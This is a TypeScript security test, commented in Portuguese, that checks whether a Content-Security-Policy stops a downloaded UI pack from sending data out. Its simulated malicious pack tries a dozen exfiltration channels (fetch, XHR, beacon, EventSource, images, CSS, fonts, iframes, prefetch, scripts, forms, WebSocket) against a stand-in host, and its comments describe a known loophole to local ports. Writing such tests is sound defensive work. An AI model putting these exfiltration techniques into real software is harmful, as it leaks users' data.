// T25029 (spec #25011): uma UI baixada pelo canal não consegue ir à rede. No WebKit headless, a página de mentira faz
// o que um pack mal-intencionado tentaria para mandar algo para fora: fetch, XHR, WebSocket, EventSource, beacon,
// imagem, CSS, fonte, iframe, prefetch e form. Com a CSP das views (`VIEWS_CSP`), nada chega à rede (`exemplo.invalid`,
// interceptada aqui). A mesma página sem a CSP chega: é o controle de que o teste vê o vazamento quando ele existe.
//
// O que fica aberto, e este teste prende para não crescer: o `connect-src ws://127.0.0.1:*` (o socket da ponte do RPC,
// #1419) também deixa fetch, XHR, beacon e EventSource irem a **qualquer porta do 127.0.0.1**. Pela CSP 3, um `ws:`
// casa com `http:` e `https:`. Não é a rede, mas um serviço local da pessoa responderia. Fechar pede a porta da ponte
// no main, que o Electrobun não expõe (T25029, #25011).

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";

import { type Browser, webkit } from "playwright-core";

import { VIEWS_CSP } from "../src/bun/window-security.ts";

const hasWebkit = (() => {
  try {
    return existsSync(webkit.executablePath());
  } catch {
    return false;
  }
})();

/** O pack mal-intencionado: tenta cada saída, para `fora` (o servidor de fora) e para a rede. */
const packScript = (fora: string) => `
const out = ${JSON.stringify(fora)};
const net = "https://exemplo.invalid";
const dado = "?nota=exemplo";
const tries = [];
const attempt = (name, fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch {} tries.push(name); };
for (const base of [out, net]) {
  attempt("fetch", () => fetch(base + "/fetch" + dado, { method: "POST", body: "nota", mode: "no-cors" }));
  attempt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", base + "/xhr" + dado); x.send(); });
  attempt("beacon", () => navigator.sendBeacon(base + "/beacon" + dado, "nota"));
  attempt("eventsource", () => new EventSource(base + "/sse" + dado));
  attempt("img", () => { const i = new Image(); i.src = base + "/img" + dado; document.body.append(i); });
  attempt("css", () => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + base + "/css" + dado + ")"; d.textContent = "x"; document.body.append(d); });
  attempt("font", () => new FontFace("Fora", "url(" + base + "/font" + dado + ")").load());
  attempt("iframe", () => { const f = document.createElement("iframe"); f.src = base + "/iframe" + dado; document.body.append(f); });
  attempt("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = base + "/prefetch" + dado; document.head.append(l); });
  attempt("script", () => { const s = document.createElement("script"); s.src = base + "/script" + dado; document.head.append(s); });
  attempt("form", () => { const f = document.createElement("form"); f.method = "POST"; f.action = base + "/form" + dado; f.target = "alvo"; document.body.append(f); f.submit(); });
}
attempt("websocket", () => new WebSocket("wss://exemplo.invalid/ws" + dado));
window.__tries = tries;
`;

describe.skipIf(!hasWebkit)("a UI baixada não vai à rede (T25029)", () => {
  let browser: Browser;
  let pack: ReturnType<typeof Bun.serve>;
  let fora: ReturnType<typeof Bun.serve>;
  const foraHits: string[] = [];

  beforeAll(async () => {
    fora = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => (foraHits.push(new URL(req.url).pathname), new Response("ok", { headers: { "access-control-allow-origin": "*" } })),
    });
    const foraBase = `http://127.0.0.1:${fora.port}`;
    pack = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch(req) {
        const { pathname } = new URL(req.url);
        const csp: Record<string, string> = pathname.startsWith("/sem-csp/") ? {} : { "Content-Security-Policy": VIEWS_CSP };
        if (pathname.endsWith("/pack.js")) return new Response(packScript(foraBase), { headers: { "Content-Type": "text/javascript", ...csp } });
        return new Response(`<!doctype html><title>pack</title><body><iframe name="alvo"></iframe><script type="module" src="pack.js"></script></body>`, {
          headers: { "Content-Type": "text/html", ...csp },
        });
      },
    });
    browser = await webkit.launch({ headless: true });
  }, 30_000);

  afterAll(async () => {
    await browser?.close();
    pack?.stop(true);
    fora?.stop(true);
  });

  /** Abre o pack e devolve o que chegou ao servidor de fora e à rede, e as saídas que o pack tentou. */
  async function run(dir: "" | "sem-csp/") {
    foraHits.length = 0;
    const page = await browser.newPage();
    const network: string[] = [];
    await page.route(/^https?:\/\/exemplo\.invalid/, (r) => (network.push(new URL(r.request().url()).pathname), r.fulfill({ status: 200, body: "ok" })));
    await page.goto(`http://127.0.0.1:${pack.port}/${dir}`);
    await page.waitForFunction(() => (window as unknown as { __tries?: string[] }).__tries !== undefined);
    await page.waitForTimeout(1_500);
    const tries = await page.evaluate(() => (window as unknown as { __tries: string[] }).__tries);
    await page.close();
    return { fora: [...foraHits].sort(), network: network.sort(), tries };
  }

  test("com a CSP das views, nenhuma saída chega à rede; no 127.0.0.1, só as do connect-src", async () => {
    const r = await run("");
    expect(r.tries).toHaveLength(23);
    expect(r.network).toEqual([]);
    // Imagem, CSS, fonte, iframe, script, prefetch e form não chegam nem ao 127.0.0.1.
    expect(r.fora.filter((p) => !["/fetch", "/xhr", "/beacon", "/sse"].includes(p))).toEqual([]);
  }, 20_000);

  test("controle: sem a CSP, a mesma página vaza (o teste enxerga o vazamento)", async () => {
    const r = await run("sem-csp/");
    expect(r.tries).toHaveLength(23);
    expect(r.fora.length + r.network.length).toBeGreaterThan(5);
  }, 20_000);
});
